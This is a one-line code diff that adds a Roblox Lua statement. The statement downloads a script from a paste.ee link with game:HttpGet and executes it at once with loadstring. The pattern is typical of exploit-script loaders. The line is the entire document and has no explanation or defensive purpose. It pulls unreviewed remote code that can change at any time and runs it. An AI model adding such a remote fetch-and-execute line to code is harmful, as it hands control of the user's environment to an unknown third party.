@@ -1,0 +1,1 @@
+ loadstring(game:HttpGet(('https://paste.ee/r/r4IOz/0'),true))()
